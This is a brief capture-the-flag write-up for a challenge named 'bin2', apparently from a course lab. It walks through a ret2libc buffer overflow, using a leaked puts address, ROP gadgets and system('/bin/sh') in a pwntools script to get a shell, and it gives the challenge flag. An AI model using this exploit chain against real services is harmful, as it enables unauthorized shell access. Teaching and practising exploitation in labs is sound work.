# bin2:Solution

The first thing that you see when you run this binary is:
```
Welcome to the challenge
The address of puts: 0x40008c7820
Provide some input >>>
```

It gives you the location of puts at run time. This challenge was given with a libc version for us to use as well. Using this library we can locate the base address of libc and use that in the exploit.

We just need to overflow the buffer
```
0040115a  4883ec40           sub     rsp, 64
```


Add 16 bytes of padding and align the stack. Find a pop rdi gadget to clear out rdi and add a bin/sh into it. Then call system and send the chain to get a shell.
```
chain = cyclic(72)
chain += p64(offset + r.find_gadget(['ret'])[0])
chain += p64(offset + r.find_gadget(['pop rdi','ret'])[0])
chain += p64(offset + next(libc.search(b'/bin/sh')))
chain += p64(offset + libc.sym['system'])

p.recvuntil(b'input >>> ')
p.sendline(chain)
p.interactive()
```

Run the python program and get the flag!
```
flag{will_b3_an_aw3s0m3_big_adv3ntur3}
```

Resources:
* the [ret2libc](https://github.com/kourtnee/VR_HW/tree/main/ret2libc) lab
* my own [challenge](https://github.com/kourtnee/VR_HW/tree/main/Midterm/bin3)
* Alex and Louie (from their help in the original ret2libc lab)
